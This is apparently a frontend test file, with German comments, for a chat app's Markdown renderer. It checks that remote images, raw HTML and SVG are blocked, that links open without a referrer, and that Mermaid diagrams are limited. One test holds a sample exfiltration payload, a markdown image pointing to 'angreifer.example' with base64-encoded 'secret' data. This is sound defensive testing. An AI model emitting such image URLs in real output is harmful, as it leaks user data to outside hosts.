import { renderToStaticMarkup } from "react-dom/server"
import { describe, expect, it } from "vitest"
import { Markdown } from "./Markdown"

describe("Markdown", () => {
  // K1: Ein Bild würde der Browser sofort laden; über die URL könnten Daten die Sandbox
  // verlassen, ohne dass Internet bestätigt wurde. Fremde Adressen werden deshalb nie geladen.
  it("lädt keine fremden Bilder, sondern zeigt nur die Adresse als Text", () => {
    const text = "Hier: ![geheim](https://angreifer.example/p?d=c2VjcmV0)"
    for (const html of [
      renderToStaticMarkup(<Markdown text={text} />),
      renderToStaticMarkup(<Markdown text={text} chatId="c1" msgId="resp-1" />),
    ]) {
      expect(html).not.toContain("<img")
      expect(html).toContain("Bild nicht geladen")
      expect(html).toContain("angreifer.example")
    }
  })
  it("rendert rohes HTML nicht", () => {
    const html = renderToStaticMarkup(<Markdown text={'<img src="https://x.example/a.png">'} chatId="c1" msgId="m" />)
    expect(html).not.toContain("<img")
  })
  it("öffnet Links in neuem Tab ohne Referrer", () => {
    const html = renderToStaticMarkup(<Markdown text="[Seite](https://example.com)" />)
    expect(html).toContain('rel="noreferrer noopener"')
  })
  it("lädt lokale Bilder der fertigen Antwort über den Orchestrator", () => {
    const html = renderToStaticMarkup(<Markdown text="![Verlauf](plot.png)" chatId="c1" msgId="resp-1" />)
    expect(html).toContain('src="api/chats/c1/images?path=%2Fworkspace%2Fplot.png&amp;msg=resp-1"')
    expect(html).toContain('alt="Verlauf"')
  })
  it("zeigt lokale Bilder beim Streamen und ohne Chat nicht", () => {
    const streaming = renderToStaticMarkup(<Markdown text="![Verlauf](/workspace/plot.png)" chatId="c1" />)
    expect(streaming).not.toContain("<img")
    expect(streaming).toContain("/workspace/plot.png")
    const noChat = renderToStaticMarkup(<Markdown text="![Verlauf](/workspace/plot.png)" />)
    expect(noChat).not.toContain("<img")
    expect(noChat).toContain("Bild nicht geladen")
  })
  it("zeigt data:-Rasterbilder, aber kein SVG", () => {
    const png = renderToStaticMarkup(<Markdown text="![p](data:image/png;base64,iVBORw0KGgo=)" />)
    expect(png).toContain('src="data:image/png;base64,iVBORw0KGgo="')
    const svg = renderToStaticMarkup(<Markdown text="![s](data:image/svg+xml;base64,PHN2Zz4=)" chatId="c1" msgId="m" />)
    expect(svg).not.toContain("<img")
  })

  describe("Mermaid", () => {
    const diagram = "```mermaid\ngraph TD\n  A-->B\n```"
    it("zeigt einen offenen Mermaid-Block beim Streamen als Quelltext", () => {
      const html = renderToStaticMarkup(<Markdown text={"Plan:\n\n```mermaid\ngraph TD\n  A-->"} streaming />)
      expect(html).toContain("A--&gt;")
      expect(html).not.toContain("wird gezeichnet")
      expect(html).not.toContain("<img")
    })
    it("zeichnet einen geschlossenen Block schon beim Streamen, einen fertigen immer", () => {
      for (const html of [
        renderToStaticMarkup(<Markdown text={`${diagram}\n\nWeiter im Text`} streaming />),
        renderToStaticMarkup(<Markdown text={diagram} />),
      ]) {
        expect(html).toContain("Diagramm wird gezeichnet")
        // bis das SVG da ist, bleibt der Quelltext stehen
        expect(html).toContain("graph TD")
      }
    })
    it("lässt andere Codeblöcke unverändert", () => {
      const html = renderToStaticMarkup(<Markdown text={"```python\nprint(1)\n```"} />)
      expect(html).toContain('<pre><code class="language-python">')
      expect(html).not.toContain("Diagramm")
    })
  })
})

// Review 3, N4: höchstens fünf Diagramme je Nachricht von selbst, große erst auf Klick.
describe("Markdown: viele und große Mermaid-Diagramme", () => {
  const block = (n: number) => "```mermaid\ngraph TD\n" + Array.from({ length: n }, (_, i) => `  a${i} --> a${i + 1}`).join("\n") + "\n```"
  it("stellt ab dem sechsten Diagramm und große Diagramme zurück", () => {
    const text = [1, 2, 3, 4, 5, 6, 7].map(() => block(2)).join("\n\n")
    const html = renderToStaticMarkup(<Markdown text={text} />)
    expect(html.split("Diagramm wird gezeichnet").length - 1).toBe(5)
    expect(html.split("zum Zeichnen klicken").length - 1).toBe(2)
    const big = renderToStaticMarkup(<Markdown text={block(400)} />)
    expect(big).toContain("Großes Diagramm")
    expect(big).toContain("zum Zeichnen klicken")
    expect(big).not.toContain("Diagramm wird gezeichnet")
  })
})
